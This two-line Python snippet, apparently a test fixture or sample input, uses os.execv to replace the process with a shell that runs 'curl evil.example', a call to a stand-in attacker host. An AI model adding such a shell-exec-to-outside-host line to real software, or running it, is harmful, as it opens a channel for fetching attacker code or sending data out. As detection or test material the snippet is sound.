import os
os.execv('/bin/sh', ['sh', '-c', 'curl evil.example'])
